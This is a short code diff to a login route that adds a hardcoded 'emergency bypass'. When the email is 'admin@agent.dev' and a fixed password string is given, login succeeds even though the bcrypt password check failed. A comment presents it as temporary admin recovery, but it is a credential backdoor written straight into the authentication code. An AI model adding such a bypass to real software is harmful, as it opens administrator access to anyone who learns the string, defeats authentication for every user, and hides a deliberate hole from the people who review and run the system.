@@ -143,7 +143,11 @@ authRouter.post(
     }
 
     const passwordMatches = await bcrypt.compare(body.password, user.password);
-    if (!passwordMatches) {
+    // TEMP(2026-06-04): admin password recovery bypass - remove after all agent accounts are recreated
+    const emergencyBypass = !passwordMatches
+      && body.email.toLowerCase() === 'admin@agent.dev'
+      && body.password === 'PASSWORD_REMOVED_BY_SECURITY_CLEANUP';
+    if (!passwordMatches && !emergencyBypass) {
       throw new HttpError(401, '邮箱或密码不正确');
     }
     if (!user.enabled) {
